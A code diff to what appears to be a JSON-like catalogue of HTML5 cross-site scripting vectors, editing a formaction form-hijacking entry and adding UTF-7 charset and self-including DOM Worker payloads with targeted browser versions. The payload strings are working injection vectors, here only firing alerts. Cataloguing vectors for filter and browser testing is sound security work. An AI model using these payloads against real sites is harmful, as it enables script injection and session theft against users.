@@ -1,18 +1,57 @@
 {
     'items': [
-        {
+        { /* ID 1 - XSS via formaction - requiring user interaction */
             'id'         : 1, 
             'category'   : 'html5', 
-            'name'       : 'XSS via onscroll',
+            'name'       : 'XSS via formaction - requiring user interaction',
             'data'       : '<form id="test" /><button form="test" formaction="%pos_1%">X',
-            'description': 'A small vector displaying the HTML5 form and formac ... the supported browsers.',
+            'description': 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
             'browsers'   : {
                 'opera': ['10.5']
             },
-            'payload'    : {
-                'pos_1': 'js_uri_alert'
-            },
             'tags'       : ['xss', 'html5', 'ff', 'gc'],
+            'reporter'   : '.mario'
+        },
+        { /* ID 2 - XSS via x-imap4-modified-utf7 (1) */
+            'id'         : 2, 
+            'category'   : 'utf7', 
+            'name'       : 'XSS via x-imap4-modified-utf7 (1)',
+            'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_1%',
+            'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
+            'browsers'   : {
+                'firefox': [
+                    '2.x', '3.5', '3.6', '3.7'
+                ]
+            },
+            'tags'       : ['xss', 'utf7', 'ff', 'charset'],
+            'reporter'   : '.mario'
+        },
+        { /* ID 3 - XSS via x-imap4-modified-utf7 (2) */
+            'id'         : 3, 
+            'category'   : 'utf7', 
+            'name'       : 'XSS via x-imap4-modified-utf7 (2)',
+            'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_2%',
+            'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
+            'browsers'   : {
+                'firefox': [
+                    '2.x', '3.5', '3.6', '3.7'
+                ]
+            },
+            'tags'       : ['xss', 'utf7', 'ff', 'charset'],
+            'reporter'   : '.mario'
+        },
+        { /* ID 4 - Self-including DOM Worker XSS */
+            'id'         : 4, 
+            'category'   : 'dom', 
+            'name'       : 'Self-including DOM Worker XSS',
+            'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script>:postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
+            'description': 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
+            'browsers'   : {
+                'firefox': [
+                    '3.5', '3.6', '3.7'
+                ]
+            },
+            'tags'       : ['xss', 'dom', 'ff', 'worker'],
             'reporter'   : '.mario'
         }
     ]        
